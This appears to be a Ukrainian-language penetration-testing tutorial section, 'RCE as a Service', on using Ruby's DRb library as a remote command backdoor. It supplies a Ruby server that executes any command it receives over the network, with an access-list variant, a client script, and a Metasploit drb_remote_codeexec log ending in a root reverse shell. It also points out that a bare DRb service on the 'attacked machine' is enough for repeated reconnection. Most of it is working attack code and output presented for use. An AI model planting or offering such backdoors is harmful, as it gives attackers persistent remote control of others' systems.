# RCE as a Сервіс
Модуль DRb(розподілена система об'єктів в Рубі) дозволяє Рубі програмам спілкуватися одна з одною на локальній машині чи через мережу. DRb використовує віддалений метод виклику(RMI) щоб передавати команди та данні між процесами..

## RCE Сервіс 
```ruby
#!/usr/bin/env ruby
require 'drb'

class RShell
   def exec(cmd)
     `#{cmd}`
   end
end

DRb.start_service("druby://0.0.0.0:8080", RShell.new)
DRb.thread.join
```
Примітка: Це працюватиме в будь-якій операційній системі.

Бібліотека `drb` підтримує ACL(Access Control List - список контролю доступу) для дозволу чи заборони окремих IP адрес. Наприклад:

```ruby
#!/usr/bin/env ruby
require 'drb'

class RShell
   def exec(cmd)
     `#{cmd}`
   end
end

# Access List
acl = ACL.new(%w{deny all
                allow localhost
                allow 192.168.1.*})
DRb.install_acl(acl)
DRb.start_service("druby://0.0.0.0:8080", RShell.new)
DRb.thread.join
```


## Клієнт 

```ruby
rshell = DRbObject.new_with_uri("druby://192.168.0.13:8080")
puts rshell.exec "id"
```

Або ж ви можете використовувати модуль з Metasploit щоб отримати елегантний шел.

```bash
msf > use exploit/linux/misc/drb_remote_codeexec 
msf exploit(drb_remote_codeexec) > set URI druby://192.168.0.13:8080
uri => druby://192.168.0.13:8080
msf exploit(drb_remote_codeexec) > exploit 

[*] Started reverse double handler
[*] trying to exploit instance_eval
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo UAR3ld0Uqnc03yNy;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket A
[*] A: "UAR3ld0Uqnc03yNy\r\n"
[*] Matching...
[*] B is input...
[*] Command shell session 2 opened (192.168.0.18:4444 -> 192.168.0.13:57811) at 2015-12-24 01:11:30 +0300

pwd
/root
id
uid=0(root) gid=0(root) groups=0(root)
```

Як бачите, навіть після втрати сесії залишається можливість підключатися знов і знов: це ж сервіс, пам'ятаєте? 

Примітка: Для використання тільки модуля Metasploit вам навіть не потрібен клас RShell. Вам лише потрібно наступне на атакованій машині:.

```ruby
#!/usr/bin/env ruby
require 'drb'
DRb.start_service("druby://0.0.0.0:8080", []).thread.join
```

Я рекомендую використовувати перший приклад якщо Metasploit не встановлено або він недоступний.

До прочитання [Технічні деталі](http://blog.recurity-labs.com/archives/2011/05/12/druby_for_penetration_testers/) про модуль "drb_remote_codeexe" з пакету Metasploit.